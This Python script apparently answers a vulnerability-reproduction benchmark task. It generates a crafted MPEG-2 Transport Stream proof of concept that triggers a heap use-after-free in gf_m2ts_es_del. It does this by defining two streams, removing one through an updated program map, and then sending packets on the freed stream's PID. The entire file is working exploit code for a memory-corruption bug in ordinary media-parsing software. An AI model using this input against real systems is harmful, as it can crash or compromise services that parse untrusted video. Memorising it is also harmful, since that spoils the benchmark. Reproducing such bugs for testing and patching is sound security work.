import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a
        Heap Use After Free vulnerability in gf_m2ts_es_del.

        The PoC is a crafted MPEG-2 Transport Stream (M2TS) file. It first
        defines a program with two elementary streams (e.g., video and audio).
        Then, it sends an updated program map that removes one of the streams,
        causing the associated memory (ES context) to be freed. Finally, it
        sends more data for the removed stream's Packet Identifier (PID),
        triggering a use-after-free when the parser attempts to process it
        using a dangling pointer.
        """

        def crc32(data: bytes) -> bytes:
            """Calculates the CRC32 checksum used in MPEG-TS PSI sections."""
            return struct.pack('>I', zlib.crc32(data))

        def create_ts_packet(
            pid: int,
            payload: bytes,
            pusi: bool,
            continuity_counter: int
        ) -> bytes:
            """
            Creates a 188-byte MPEG-TS packet.
            """
            header = bytearray(b'\x47\x00\x00\x10')  # Sync byte, flags, payload-only

            # Set Packet Identifier (PID)
            header[1] = (pid >> 8) & 0x1F
            header[2] = pid & 0xFF

            # Set Payload Unit Start Indicator (PUSI)
            if pusi:
                header[1] |= 0x40

            # Set Continuity Counter
            header[3] |= continuity_counter & 0x0F

            packet = header + payload
            # Pad the rest of the packet with 0xFF
            packet += b'\xff' * (188 - len(packet))
            return bytes(packet)

        def create_psi_packet(
            pid: int, section: bytes, pusi: bool, continuity_counter: int
        ) -> bytes:
            """
            Creates a Program-Specific Information (PSI) packet (like PAT or PMT).
            It wraps the section data with a pointer field and a CRC32 checksum.
            """
            crc = crc32(section)
            payload = b'\x00' + section + crc  # pointer_field + section data + crc
            return create_ts_packet(pid, payload, pusi=pusi, continuity_counter=continuity_counter)

        poc = bytearray()
        continuity_counters = {}

        def get_cc(pid: int) -> int:
            """Gets and increments the continuity counter for a given PID."""
            continuity_counters.setdefault(pid, 0)
            val = continuity_counters[pid]
            continuity_counters[pid] = (val + 1) % 16
            return val

        # Packet 1: Program Association Table (PAT)
        # Maps Program 1 to PMT with PID 0x100
        pat_section = bytes.fromhex(
            "00b00d0001c100000001e100"
        )
        poc.extend(create_psi_packet(0x000, pat_section, True, get_cc(0x000)))

        # Packet 2: Program Map Table (PMT), Version 0
        # Defines Program 1 with Video (PID 0x101) and Audio (PID 0x102)
        pmt_section_v0 = bytes.fromhex(
            "02b0170001c10000e101f000"  # PMT header
            "1be101f000"                # Stream 1: H.264 Video on PID 0x101
            "0fe102f000"                # Stream 2: AAC Audio on PID 0x102
        )
        poc.extend(create_psi_packet(0x100, pmt_section_v0, True, get_cc(0x100)))

        # Packet 3: Video Data Packet for PID 0x101
        # This packet establishes the stream in the demuxer.
        video_payload = b'\x00\x00\x01\xb0\x01'
        poc.extend(create_ts_packet(0x101, video_payload, True, get_cc(0x101)))

        # Packet 4: Program Map Table (PMT), Version 1
        # This is an update that removes the video stream (PID 0x101).
        # Processing this packet should cause the gf_m2ts_es_del function to be called.
        pmt_section_v1 = bytes.fromhex(
            "02b0120001c30000e102f000"  # PMT header, version updated to 1
            "0fe102f000"                # Stream 1: AAC Audio only
        )
        poc.extend(create_psi_packet(0x100, pmt_section_v1, True, get_cc(0x100)))

        # Packet 5: Video Data Packet for the now-removed PID 0x101
        # This packet triggers the use-after-free, as the demuxer might still
        # hold a dangling pointer to the ES context for PID 0x101.
        poc.extend(create_ts_packet(0x101, video_payload, True, get_cc(0x101)))

        # Packet 6: Another video data packet to ensure the crash is triggered.
        poc.extend(create_ts_packet(0x101, video_payload, True, get_cc(0x101)))

        return bytes(poc)